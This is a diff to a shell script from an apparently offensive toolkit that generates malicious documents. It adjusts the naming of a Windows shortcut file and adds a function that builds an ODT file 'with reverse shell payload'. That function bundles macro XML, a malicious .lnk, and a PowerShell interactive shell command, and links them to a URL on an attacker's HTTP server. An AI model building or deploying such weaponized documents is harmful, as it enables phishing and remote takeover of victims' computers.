@@ -21,9 +21,11 @@ generate_windows_shortcut() {
     else
         echo "Using cmd=$cmd"
     fi
-    local shortcut_name=$1
     if [[ -z "$shortcut_name" ]]; then
-        shortcut_name="automatic_configuration.lnk"
+        shortcut_name=$1
+        if [[ -z "$shortcut_name" ]]; then
+            shortcut_name="automatic_configuration.lnk"
+        fi
     fi
     cp $SCRIPTDIR/../ps1/windows_shortcut.ps1 .
     #local target_path="${cmd%% *}"
@@ -177,6 +179,21 @@ get_xls_macro() {
     fi
     cp $SCRIPTDIR/../python/generate_macro.py .
     python3 generate_macro.py xls "$cmd"
+
+}
+
+generate_odt() {
+    echo "Generating ODT file with reverse shell payload."
+    cp $SCRIPTDIR/../python/generate_odt.py .
+    cp $SCRIPTDIR/../xml/content.xml .
+    cp $SCRIPTDIR/../xml/manifest.xml .
+    cp $SCRIPTDIR/../xml/script-lb.xml .
+    cp $SCRIPTDIR/../xml/script-lc.xml .
+    generate_windows_shortcut
+    if [[ -z "$cmd" ]]; then
+        cmd=$(get_powershell_interactive_shell)
+    fi
+    python3 generate_odt.py output.odt "http://$http_ip:$http_port/shortcuts/$shortcut_name" "$cmd"
 
 }
 
